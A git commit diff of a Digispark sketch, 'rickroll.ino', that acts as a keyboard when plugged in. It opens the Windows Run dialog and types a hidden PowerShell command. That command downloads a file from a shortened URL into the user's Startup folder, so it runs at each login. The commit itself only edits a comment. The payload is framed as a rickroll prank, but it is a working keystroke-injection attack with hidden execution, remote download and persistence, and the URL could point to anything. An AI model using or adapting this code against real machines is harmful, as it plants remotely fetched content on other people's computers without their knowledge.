328bafdbccdcdaf2a353b1a8486fd55f7a3f93c4
TyraVex <34800546+TyraVex@users.noreply.github.com>
2021-11-20 23:55:21 +0100

    Update rickroll.ino

--- rickroll/rickroll.ino
+++ rickroll/rickroll.ino
@@ -1,10 +1,11 @@
 #include "DigiKeyboardFr.h"
 
 void setup() {
-  //open powershell
+  //opens powershell
   DigiKeyboardFr.delay(1);
   DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
   DigiKeyboardFr.delay(50);
+  
   //write powershell -windowstyle hidden -command "iwr u.nu/d1uTS -o \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\rl.url\""
   DigiKeyboardFr.println("powershell -windowstyle hidden -command \"iwr u.nu/d1uTS -o \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rl.url\\\"\"");
 }
